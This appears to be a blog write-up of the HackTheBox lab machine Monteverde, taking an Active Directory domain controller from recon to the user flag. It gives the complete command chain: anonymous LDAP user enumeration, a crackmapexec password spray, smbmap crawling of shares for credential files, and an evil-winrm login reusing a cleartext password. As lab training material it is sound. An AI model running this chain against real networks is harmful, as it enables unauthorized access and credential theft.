---
title: "Monteverde"
date: 2026-10-06 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, medium, active-directory, anonymous-ldap, password-spray, smb, credential-reuse, winrm]
image:
    path: /assets/Images/Monteverde-avatar.png
    alt: Monteverde
description: "A domain controller allows anonymous LDAP binds and has no lockout policy, so a username-as-password spray lands SABatchJobs, whose share access leaks a cleartext password in azure.xml that is reused for the WinRM-enabled mhope account and the user flag."
---
## Overview

Monteverde is a medium-difficulty Windows box built around a misconfigured Active Directory domain (`MEGABANK.LOCAL`). The domain controller permits anonymous LDAP binds and sets no account lockout threshold, so an unauthenticated attacker can pull the full user list and safely password-spray it. A `username == password` spray lands the `SABatchJobs` service account, which can read a world-readable share holding `mhope\azure.xml` with a cleartext password. That password is reused for the `mhope` domain account — a member of `Remote Management Users` — so evil-winrm gives an interactive shell and the user flag. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 254.6,116.0 150.0,150.0 137.1,167.8 150.0,150.0" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Classic realistic AD misconfig box — anonymous LDAP, no lockout, username==password spray, and a cleartext azure.xml password reused for WinRM — driven by enumeration with zero CVE or custom work.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | Simple DNS Plus |
| 88/tcp | Kerberos | DC — `MEGABANK.LOCAL` |
| 135/tcp | MSRPC | Windows RPC |
| 139/tcp | NetBIOS-SSN | |
| 389/tcp | LDAP | anonymous bind allowed |
| 445/tcp | SMB | `users$` share |
| 464/tcp | kpasswd | |
| 593/tcp | RPC over HTTP | |
| 636/tcp | LDAPS | |
| 3268/3269/tcp | Global Catalog | |
| 5985/tcp | WinRM | `Remote Management Users` |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.X | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); nmap -p$ports -sC -sV 10.10.10.X
```

The Kerberos, LDAP, and Global Catalog ports identify a domain controller for `MEGABANK.LOCAL`. The combination of open 389 and 5985 hints at the path: enumerate the directory, then find a way onto WinRM.

## Enumeration

The DC accepts an **anonymous LDAP bind**, so the directory is readable with no credentials. Confirm the bind, then dump every user object.

```bash
wget https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py
python windapsearch.py -u "" --dc-ip 10.10.10.X
python windapsearch.py -u "" --dc-ip 10.10.10.X -U
```

This returns a small list of accounts including `SABatchJobs`, `mhope`, and the `AAD_*` sync account. Check who can reach WinRM — the target for any credential we recover.

```bash
python windapsearch.py -u "" --dc-ip 10.10.10.X -U -m "Remote Management Users"
```

`mhope` is the only member. Before spraying, confirm it is safe by reading the password policy.

```bash
enum4linux -a 10.10.10.X
```

The **Account Lockout Threshold is `None`** — there is no risk of locking accounts, so a spray is free.

## Foothold

**1 — Build the spray lists.** A very common weak pattern is `password == username`, so extract the usernames and append them to a short password list as candidate passwords.

```bash
python windapsearch.py -u "" --dc-ip 10.10.10.X -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt
cat users.txt >> english-basic.txt
```

**2 — Password spray over SMB.** With no lockout policy, spraying the user list against the candidate passwords is safe.

```bash
crackmapexec smb 10.10.10.X -d megabank -u users.txt -p english-basic.txt
```

This hits `[+] megabank\SABatchJobs:SABatchJobs` — the account's password is literally its username.

**3 — Loot the shares.** Enumerate what `SABatchJobs` can read, then crawl for credential-bearing files.

```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.X
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.X -A '(xlsx|docx|txt|xml)' -R
```

The `users$` share is READ-only, and the recursive crawl pulls `users$\mhope\azure.xml`.

```bash
cat 10.10.10.X-users_mhope_azure.xml
```

The XML contains a cleartext `<S N="Password">` field — a password stored in plaintext on a share readable by a low-privileged account.

**4 — Credential reuse to WinRM.** That password is reused for the local `mhope` domain account, which is a member of `Remote Management Users`, so evil-winrm logs in.

```bash
evil-winrm -i 10.10.10.X -u mhope -p '<password from azure.xml>'
```

## User flag

```powershell
type C:\Users\mhope\Desktop\user.txt
```

```
[redacted]
```

An interactive shell as `mhope` and the user flag are ours.

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Monteverde-avatar.png" alt="Monteverde" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
